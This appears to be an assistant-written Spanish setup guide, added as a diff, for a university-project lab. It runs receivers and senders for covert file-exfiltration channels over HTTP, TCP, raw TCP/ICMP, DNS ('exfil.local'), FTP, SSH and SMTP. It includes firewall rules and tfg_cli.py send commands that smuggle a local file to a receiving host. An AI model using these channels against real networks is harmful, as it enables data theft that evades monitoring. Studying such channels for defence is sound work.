@@ -1,0 +1,320 @@
+1) Mapa de puertos y permisos (todo en el mismo servidor)
+Componente	Puerto/Protocolo (servidor)	Notas de SO / Permisos
+HTTP receptor	8080/TCP	Abrir en firewall.
+TCP receptor (método 3 “Length”)	9000/TCP	Abrir en firewall.
+TCP/ICMP RAW (métodos 1–2 TCP, 1–3 ICMP)	—	RAW: Windows Admin + Npcap / Linux sudo o CAP_NET_RAW.
+DNS receptor (autoridad mínima)	53/UDP, 53/TCP	Abrir en firewall. Asegúrate de que nadie usa 53.
+FTP servidor (FileZilla/ vsftpd)	21/TCP + PASV (p.ej. 50000–50100/TCP)	Abrir 21 + rango PASV en firewall.
+SSH servidor (OpenSSH)	22/TCP	Abrir en firewall.
+SMTP servidor	25/TCP o 587/TCP	Abrir en firewall (recomiendo 587 con STARTTLS).
+IMAP servidor	143/TCP o 993/TCP	Abrir en firewall (recomiendo 993 TLS).
+ICMP	—	Permitir ICMP entrante.
+
+Los receptores HTTP/TCP/DNS se ejecutan con tfg_cli.py receive en este servidor.
+Los servicios base (FTP/SSH/SMTP/IMAP) también viven en este mismo servidor.
+Para pruebas LAN, el emisor puede estar en otro equipo apuntando a la IP del servidor.
+
+2) Windows Server (10/11) – instalación y apertura de puertos
+2.1. Prepara Python y dependencias
+
+PowerShell (como usuario normal; para RAW usarás consola “Como Administrador”):
+
+cd C:\tfg
+py -3 -m pip install -r .\requirements.txt
+
+2.2. Habilita RAW (TCP/ICMP)
+
+Instala Npcap (modo WinPcap compatible).
+
+Para ejecutar métodos RAW, abre PowerShell “Ejecutar como Administrador”.
+
+2.3. OpenSSH Server (22/TCP)
+
+PowerShell (Admin):
+
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+Start-Service sshd
+Set-Service -Name sshd -StartupType Automatic
+# Firewall:
+New-NetFirewallRule -Name "TFG SSH 22" -Protocol TCP -LocalPort 22 -Direction Inbound -Action Allow
+
+2.4. FTP Server (FileZilla Server)
+
+Instala FileZilla Server.
+
+Crea usuario, fija carpeta (por ejemplo C:\tfg\ftproot), habilita PASV con rango p.ej. 50000–50100.
+
+Firewall:
+
+New-NetFirewallRule -Name "TFG FTP 21" -Protocol TCP -LocalPort 21 -Direction Inbound -Action Allow
+# Rango PASV (ajústalo a lo configurado en FileZilla)
+New-NetFirewallRule -Name "TFG FTP PASV" -Protocol TCP -LocalPort 50000-50100 -Direction Inbound -Action Allow
+
+2.5. SMTP/IMAP en el propio servidor
+
+Instala hMailServer (o similar).
+
+Configura:
+
+Dominio local (p.ej. lan.local) y una cuenta user@lan.local.
+
+SMTP escuchando 587/TCP (submission con STARTTLS).
+
+IMAP escuchando 993/TCP (TLS).
+
+Firewall:
+
+New-NetFirewallRule -Name "TFG SMTP 587" -Protocol TCP -LocalPort 587 -Direction Inbound -Action Allow
+New-NetFirewallRule -Name "TFG IMAP 993" -Protocol TCP -LocalPort 993 -Direction Inbound -Action Allow
+
+2.6. HTTP / TCP Length / DNS receptores en la misma máquina
+
+Firewall:
+
+New-NetFirewallRule -Name "TFG HTTP 8080" -Protocol TCP -LocalPort 8080 -Direction Inbound -Action Allow
+New-NetFirewallRule -Name "TFG TCP 9000" -Protocol TCP -LocalPort 9000 -Direction Inbound -Action Allow
+New-NetFirewallRule -Name "TFG DNS 53 UDP" -Protocol UDP -LocalPort 53 -Direction Inbound -Action Allow
+New-NetFirewallRule -Name "TFG DNS 53 TCP" -Protocol TCP -LocalPort 53 -Direction Inbound -Action Allow
+# ICMP:
+netsh advfirewall firewall add rule name="TFG ICMPv4 In" dir=in action=allow protocol=icmpv4
+
+3) Raspbian (Raspberry Pi OS) – instalación y apertura de puertos
+3.1. Prepara Python y dependencias
+cd ~/tfg
+python3 -m pip install --user -r requirements.txt
+
+3.2. Habilita RAW (TCP/ICMP)
+
+Ejecuta comandos con sudo, o asigna capacidades:
+
+sudo setcap cap_net_raw,cap_net_admin+eip "$(readlink -f $(which python3))"
+
+3.3. OpenSSH Server (22/TCP)
+
+Raspbian suele traerlo instalado:
+
+sudo systemctl enable --now ssh
+sudo ss -lntp | grep :22
+sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+
+3.4. FTP Server (vsftpd)
+sudo apt update
+sudo apt install -y vsftpd
+sudo cp /etc/vsftpd.conf /etc/vsftpd.conf.bak
+sudo bash -c 'cat >/etc/vsftpd.conf' <<'CONF'
+listen=YES
+listen_ipv6=NO
+anonymous_enable=NO
+local_enable=YES
+write_enable=YES
+chroot_local_user=YES
+allow_writeable_chroot=YES
+pasv_enable=YES
+pasv_min_port=50000
+pasv_max_port=50100
+ssl_enable=NO
+CONF
+sudo systemctl restart vsftpd
+sudo iptables -A INPUT -p tcp --dport 21 -j ACCEPT
+sudo iptables -A INPUT -p tcp --dport 50000:50100 -j ACCEPT
+# crea un usuario de sistema, si lo necesitas:
+# sudo adduser ftpuser
+
+3.5. SMTP/IMAP locales (Postfix + Dovecot, modo laboratorio)
+sudo apt install -y postfix dovecot-imapd
+# Postfix como "Internet Site" o "Satellite"; para LAN de pruebas basta local.
+# Dovecot IMAP (143/993); habilita IMAP-SSL si lo deseas.
+sudo systemctl enable --now postfix dovecot
+sudo iptables -A INPUT -p tcp --dport 587 -j ACCEPT   # si habilitas submission en Postfix
+sudo iptables -A INPUT -p tcp --dport 993 -j ACCEPT   # IMAPS Dovecot
+
+
+Configurar Postfix/Dovecot puede variar; para pruebas, usa cuentas locales del sistema (PAM) o usuarios virtuales si prefieres.
+
+3.6. HTTP / TCP Length / DNS receptores en la misma máquina
+sudo iptables -A INPUT -p tcp --dport 8080 -j ACCEPT
+sudo iptables -A INPUT -p tcp --dport 9000 -j ACCEPT
+sudo iptables -A INPUT -p udp --dport 53   -j ACCEPT
+sudo iptables -A INPUT -p tcp --dport 53   -j ACCEPT
+sudo iptables -A INPUT -p icmp -j ACCEPT
+
+
+Asegúrate de que nada usa 53:
+
+sudo ss -ulpn | grep ":53" || true
+
+4) Arranque de receptores (en el propio servidor)
+
+Abre una consola por receptor (puedes tener varios a la vez). Todas las rutas apuntan a esta máquina.
+
+4.1. HTTP receptor
+python3 tfg_cli.py receive \
+  --transfer-id RXHTTP \
+  --canal HTTP --metodo 1 \
+  --host 0.0.0.0 --puerto 8080 --ruta /upload \
+  --plugins-dir plugins \
+  --out-file ./salida_http.bin
+
+4.2. TCP receptor (método 3 “Length”)
+python3 tfg_cli.py receive \
+  --transfer-id RXTCP3 \
+  --canal TCP --metodo 3 \
+  --host 0.0.0.0 --puerto 9000 \
+  --plugins-dir plugins \
+  --out-file ./salida_tcp_len.bin
+
+4.3. TCP receptor RAW (método 1 o 2)
+# Windows: PowerShell como Administrador. Raspbian: usa sudo si no diste capacidades.
+python3 tfg_cli.py receive \
+  --transfer-id RXTCP1 \
+  --canal TCP --metodo 1 \
+  --host 0.0.0.0 --puerto 9001 \
+  --plugins-dir plugins \
+  --out-file ./salida_tcp_raw.bin
+
+4.4. ICMP receptor RAW (métodos 1–3)
+python3 tfg_cli.py receive \
+  --transfer-id RXICMP2 \
+  --canal ICMP --metodo 2 \
+  --host <IP_del_servidor> \
+  --plugins-dir plugins \
+  --out-file ./salida_icmp.bin
+
+4.5. DNS receptor (autoridad mínima)
+# Si el 53 está libre:
+python3 tfg_cli.py receive \
+  --transfer-id RXDNS \
+  --canal DNS --metodo 1 \
+  --bind-host 0.0.0.0 --bind-port 53 \
+  --root-domain exfil.local \
+  --plugins-dir plugins \
+  --out-file ./salida_dns.bin
+
+4.6. FTP receptor (reconstrucción desde tu FTP local)
+python3 tfg_cli.py receive \
+  --transfer-id RXFTP2 \
+  --canal FTP --metodo 2 \
+  --host 127.0.0.1 --port 21 \
+  --user <ftp_user> --password <ftp_pass> --root / \
+  --plugins-dir plugins \
+  --out-file ./salida_ftp2.bin
+
+4.7. SSH receptor (reconstrucción desde tu SFTP local)
+python3 tfg_cli.py receive \
+  --transfer-id RXSSH3 \
+  --canal SSH --metodo 3 \
+  --host 127.0.0.1 --port 22 \
+  --user <ssh_user> --password <ssh_pass> --remote-dir /tmp \
+  --plugins-dir plugins \
+  --out-file ./salida_ssh3.bin
+
+4.8. SMTP/IMAP receptor (reconstrucción desde tu IMAP local)
+python3 tfg_cli.py receive \
+  --transfer-id RXSMTP \
+  --canal SMTP --metodo 1 \
+  --imap-host 127.0.0.1 --imap-port 993 \
+  --imap-user user@lan.local --imap-pass P@ss \
+  --plugins-dir plugins \
+  --out-file ./salida_smtp.bin
+
+5) Arranque de emisores (desde otro equipo en la LAN, apuntando a este servidor)
+
+Cambia <IP_SERVIDOR> por la IP del servidor. El recurso a enviar es local al emisor.
+
+Ejemplos:
+
+HTTP:
+
+py -3 tfg_cli.py send ^
+  --transfer-id RXHTTP ^
+  --canal HTTP --metodo 1 ^
+  --host <IP_SERVIDOR> --puerto 8080 --ruta /upload ^
+  --recurso-tipo ARCHIVO --recurso-ubicacion C:\fichero.txt ^
+  --plugins-dir plugins
+
+
+TCP Length:
+
+py -3 tfg_cli.py send ^
+  --transfer-id RXTCP3 ^
+  --canal TCP --metodo 3 ^
+  --host <IP_SERVIDOR> --puerto 9000 ^
+  --recurso-tipo ARCHIVO --recurso-ubicacion C:\fichero.txt ^
+  --plugins-dir plugins
+
+
+ICMP Sequence (RAW):
+
+py -3 tfg_cli.py send ^
+  --transfer-id RXICMP2 ^
+  --canal ICMP --metodo 2 ^
+  --host <IP_SERVIDOR> ^
+  --recurso-tipo ARCHIVO --recurso-ubicacion C:\fichero.txt ^
+  --plugins-dir plugins
+
+
+DNS:
+
+py -3 tfg_cli.py send ^
+  --transfer-id RXDNS ^
+  --canal DNS --metodo 1 ^
+  --host <IP_SERVIDOR> --port 53 ^
+  --root-domain exfil.local ^
+  --recurso-tipo ARCHIVO --recurso-ubicacion C:\fichero.txt ^
+  --plugins-dir plugins
+
+
+FTP (nombre / tamaño):
+
+# nombre (metodo 2)
+py -3 tfg_cli.py send ^
+  --transfer-id RXFTP2 ^
+  --canal FTP --metodo 2 ^
+  --host <IP_SERVIDOR> --port 21 ^
+  --user <ftp_user> --password <ftp_pass> --root / ^
+  --recurso-tipo ARCHIVO --recurso-ubicacion C:\fichero.txt ^
+  --plugins-dir plugins
+
+# tamaño (metodo 3) — igual cambiando --metodo 3
+
+
+SSH (nombre / tamaño):
+
+# tamaño (metodo 3)
+py -3 tfg_cli.py send ^
+  --transfer-id RXSSH3 ^
+  --canal SSH --metodo 3 ^
+  --host <IP_SERVIDOR> --port 22 ^
+  --user <ssh_user> --password <ssh_pass> --remote-dir /tmp ^
+  --recurso-tipo ARCHIVO --recurso-ubicacion C:\fichero.txt ^
+  --plugins-dir plugins
+
+
+SMTP:
+
+py -3 tfg_cli.py send ^
+  --transfer-id RXSMTP ^
+  --canal SMTP --metodo 1 ^
+  --smtp-host <IP_SERVIDOR> --smtp-port 587 ^
+  --smtp-user user@lan.local --smtp-pass P@ss ^
+  --to user@lan.local ^
+  --recurso-tipo ARCHIVO --recurso-ubicacion C:\fichero.txt ^
+  --plugins-dir plugins
+
+6) Verificación rápida
+
+Puertos (Windows):
+
+netstat -abno | findstr /R /C:":8080" /C:":9000" /C:":53" /C:":21" /C:":22" /C:":587" /C:":993"
+
+
+Puertos (Raspbian):
+
+sudo ss -lntup | egrep ":8080|:9000|:53|:21|:22|:587|:993"
+
+
+DNS 53 libre: asegúrate de que no hay otros servicios atados si vas a usar el receptor DNS integrado.
+
+RAW: si no recibes nada en ICMP/TCP RAW, revisa Npcap/Admin (Windows) o sudo/capabilities (Raspbian).
+
+Si me dices qué canal/método quieres probar primero en este servidor unificado (y el sistema operativo), te devuelvo exactamente los comandos ajustados con tus usuarios, rutas y nombres de dominio internos para que copies y pegues.
